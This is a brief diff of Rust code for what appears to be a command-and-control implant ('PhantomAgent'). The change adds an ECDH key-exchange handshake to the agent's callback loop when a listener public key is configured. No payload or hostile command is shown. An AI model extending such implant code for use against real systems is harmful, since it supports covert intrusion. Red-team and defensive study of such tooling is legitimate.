@@ -13,7 +13,11 @@ use crate::error::PhantomError;
 impl PhantomAgent {
     /// Run the main callback loop until exit conditions are met.
     pub async fn run(&mut self) -> Result<(), PhantomError> {
-        self.init_handshake().await?;
+        if self.config.listener_pub_key.is_some() {
+            self.ecdh_init_handshake().await?;
+        } else {
+            self.init_handshake().await?;
+        }
         info!(agent_id = format_args!("0x{:08X}", self.agent_id), "phantom initialized");
 
         loop {
